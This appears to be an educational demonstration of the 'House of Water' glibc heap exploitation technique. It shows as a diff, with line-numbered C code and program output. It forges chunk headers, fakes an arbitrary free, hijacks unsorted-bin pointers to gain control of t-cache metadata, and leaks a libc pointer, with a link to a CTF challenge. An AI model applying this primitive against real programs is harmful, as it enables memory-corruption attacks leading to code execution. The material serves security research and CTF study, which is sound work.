@@ -1,0 +1,297 @@
+38  void *_ = NULL;
+
+58  void *fake_size_lsb = malloc(0x3d8);
+59  void *fake_size_msb = malloc(0x3e8);
+63  free(fake_size_lsb);
+64  free(fake_size_msb);
+
+68  void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
+
+76  void *x[7];
+77  for (int i = 0; i < 7; i++) {
+78      x[i] = malloc(0x88);
+79  }
+
+94  void *unsorted_start = malloc(0x88);
+96  _ = malloc(0x18);
+100 void *unsorted_middle = malloc(0x88);
+102 _ = malloc(0x18);
+106 void *unsorted_end = malloc(0x88);
+108 _ = malloc(0x18);
+
+125 _ = malloc(0xf000);
+126 void *end_of_fake = malloc(0x18);
+135 *(long *)end_of_fake = 0x10000;
+137 *(long *)(end_of_fake+0x8) = 0x20;
+
+156 for (int i = 0; i < 7; i++) {
+157     free(x[i]);
+158 }
+
+211 *(long*)(unsorted_start-0x18) = 0x31;
+219 free(unsorted_start-0x10);
+225 *(long*)(unsorted_start-0x8) = 0x91;
+240 *(long*)(unsorted_end-0x18) = 0x21;
+248 free(unsorted_end-0x10);
+253 *(long*)(unsorted_end-0x8) = 0x91;
+
+267 free(unsorted_end);
+270 free(unsorted_middle);
+273 free(unsorted_start);
+
+313 *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
+318 *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);
+
+343 void *meta_chunk = malloc(0x288);
+347 assert(meta_chunk == (metadata+0x90));
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	==============================
+	|           STEP 1           |
+	==============================
+
+
+Allocate and free a chunk in 0x3e0 and 0x3f0 t-caches. This sets both
+their t-cache entry counts to 1 and creates a fake 0x10001 header:
+	- chunks:
+		* Entry 0x3e0 @ 0x555c1f9ac2a0
+		* Entry 0x3f0 @ 0x555c1f9ac680
+
+The t-cache metadata will now have the following entry counts:
+0x0000555c1f9ac070		0x0000000000000000  0x0000000000000000
+0x0000555c1f9ac080		0x0000000000000000  0x0000000000010001
+0x0000555c1f9ac090		0x0000000000000000  0x0000000000000000
+
+Allocate 7 0x88 chunks needed to fill out the 0x90 t-cache at a later time
+
+
+
+	==============================
+	|           STEP 2           |
+	==============================
+
+
+Now, allocate three 0x90 chunks with guard chunks in between. This prevents
+chunk-consolidation and sets our target for the house of water attack.
+	- chunks:
+		* unsorted_start	@ 0x555c1f9ace60
+		* /guard/
+		* unsorted_middle	@ 0x555c1f9acf10
+		* /guard/
+		* unsorted_end		@ 0x555c1f9acfc0
+		* /guard/
+
+
+
+	==============================
+	|           STEP 3           |
+	==============================
+
+
+Make an allocation to reach the end of the faked chunk
+	- chunks:
+		* padding		@ 0x555c1f9ad070
+		* end of fake		@ 0x555c1f9bc080
+
+Write the correct metadata to the chunk to prevent libc from failing checks:
+	*0x555c1f9bc080 = 0x10000
+	*0x555c1f9bc088 = 0x20
+
+Creating the following setup:
+
+0x0000555c1f9bc080		0x0000000000010000  0x0000000000000020
+
+
+
+	==============================
+	|           STEP 4           |
+	==============================
+
+
+Fill up the 0x90 t-cache with the chunks allocated from earlier by freeing them.
+By doing so, the next time a 0x88 chunk is free'd, it ends up in the unsorted-bin
+instead of the t-cache or small-bins.
+
+
+
+
+	==============================
+	|           STEP 5           |
+	==============================
+
+
+Here comes the trickiest part!
+
+We essentially want a pointer in the 0x20 t-cache metadata to act as a FWD
+pointer and a pointer in the 0x30 t-cache to act as a BCK pointer.
+We want it such that it points to the chunk header of our unsorted bin entries,
+and not at the chunk itself which is common for t-cache.
+
+Using a technique like house of botcake or a stronger arb-free primitive, free a
+chunk such that it overlaps with the header of unsorted_start and unsorte_end.
+
+It should look like the following:
+
+unsorted_start:
+0x0000555c1f9ace50		0x0000000000000000  0x0000000000000091  <-- tcachebins[0x30][0/1], unsortedbin[all][0]
+0x0000555c1f9ace60		0x0000000000000000  0x0000000000000000
+0x0000555c1f9ace70		0x0000000000000000  0x0000000000000000
+
+unsorted_end:
+0x0000555c1f9acfb0		0x0000000000000000  0x0000000000000091  <-- tcachebins[0x20][0/1], unsortedbin[all][2]
+0x0000555c1f9acfc0		0x0000000000000000  0x0000000000000000
+0x0000555c1f9acfd0		0x0000000000000000  0x0000000000000000
+
+
+If you want to see a blind example using only double free, see the following chal: 
+https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki
+
+
+For the sake of simplicity, let's just simulate an arbitrary free primitive.
+
+
+--------------------
+|      PART 1      |
+--------------------
+
+
+Write 0x31 above unsorted_start to enable its freeing into the 0x30 t-cache.
+	*0x555c1f9ace60-0x18 = 0x31
+
+This creates a 0x31 entry just above unsorted_start, which looks like the following:
+0x0000555c1f9ace40		0x0000000000000000  0x0000000000000031
+0x0000555c1f9ace50		0x0000000000000000  0x0000000000000091
+0x0000555c1f9ace60		0x0000000000000000  0x0000000000000000
+
+Free the faked 0x31 chunk @ 0x555c1f9ace50
+
+Finally, because of the meta-data created by free'ing the 0x31 chunk, we need to
+restore the original header of the unsorted_start chunk by restoring the 0x91 header:
+	*0x555c1f9ace60-0x8 = 0x91
+
+Now, let's do the same for unsorted_end except using a 0x21 faked chunk.
+
+--------------------
+|      PART 2      |
+--------------------
+
+
+Write 0x21 above unsorted_end, such that it can be free'd in to the 0x20 t-cache:
+	*0x555c1f9acfc0-0x18 = 0x21
+
+This creates a 0x21 just above unsorted_end, which looks like the following:
+0x0000555c1f9acfa0		0x0000000000000000  0x0000000000000021
+0x0000555c1f9acfb0		0x0000000000000000  0x0000000000000091
+0x0000555c1f9acfc0		0x0000000000000000  0x0000000000000000
+
+Free the faked 0x21 chunk @ 0x555c1f9acfb0
+
+restore the original header of the unsorted_end chunk by restoring the 0x91 header:
+	*0x555c1f9acfc0-0x8 = 0x91
+
+
+
+	==============================
+	|           STEP 6           |
+	==============================
+
+
+Now, let's free the unsorted bin entries!
+	> free(unsorted_end);
+	> free(unsorted_middle);
+	> free(unsorted_start);
+
+
+At this point, our heap looks something like this:
+	- Unsorted bin:
+		unsorted_start <--> unsorted_middle <--> unsorted_end
+		0x555c1f9ace50 <--> 0x555c1f9acf00 <--> 0x555c1f9acfb0
+	- 0x20 t-cache:
+		* 0x555c1f9acfb0
+	- 0x30 t-cache
+		* 0x555c1f9ace50
+
+The fake chunk in the t-cache will look like the following:
+0x0000555c1f9ac070		0x0000000000000000  0x0000000000000000
+0x0000555c1f9ac080		0x0000000000000000  0x0000000000010001
+0x0000555c1f9ac090		0x0000555c1f9acfb0  0x0000555c1f9ace50
+0x0000555c1f9ac0a0		0x0000000000000000  0x0000000000000000
+
+We can now observe that the 0x30 t-cache points to unsorted_start and 0x20 t-cache points to 
+unsorted_end, which is what we need to fake an unsorted-bin entry and hijack unsorted_middle.
+
+
+	==============================
+	|           STEP 7           |
+	==============================
+
+
+Finally, all there is left to do is simply overwrite the LSB of unsorted_start FWD-
+and BCK pointer for unsorted_end to point to the faked t-cache metadata chunk.
+
+	- unsorted_start:
+		*0x555c1f9ace60 = 0x555c1f9ac080
+
+	- unsorted_end:
+		*0x555c1f9acfc0 = 0x555c1f9ac080
+
+At this point, the unsorted bin will look like the following:
+
+	- unsorted bin:
+		 unsorted_start <--> metadata chunk <--> unsorted_end
+		 0x555c1f9ace60	     0x555c1f9ac080      0x555c1f9acfc0
+
+
+	==============================
+	|           STEP 8           |
+	==============================
+
+
+Now, simply just allocate a chunk that's within the 0x10000 range
+to allocate from the faked chunk. As an example, we will allocate a 0x288:
+	- 0x288 chunk:
+		New chunk	 @ 0x555c1f9ac090
+		t-cache metadata @ 0x555c1f9ac000
+
+
+
+	==============================
+	|           BONUS!           |
+	==============================
+
+
+Whilst the primary goal of this house is to provide a leakless way
+to gain t-cache control by overwriting LSB, a nice bonus is the free LIBC
+pointer we get as an added bonus to the method!
+
+This is what the t-cache metadata will look like after we allocated the
+t-cache metadata chunk:
+0x0000555c1f9ac070		0x0000000000000000  0x0000000000000000
+0x0000555c1f9ac080		0x0000000000000000  0x0000000000000291
+0x0000555c1f9ac090		0x00007f19339112a0  0x00007f19339112a0
+0x0000555c1f9ac0a0		0x0000555c1f9ac080  0x0000555c1f9ac080
+
+Notice how the 0x20 and 0x30 t-cache now contains a libc pointer to the main_arena.
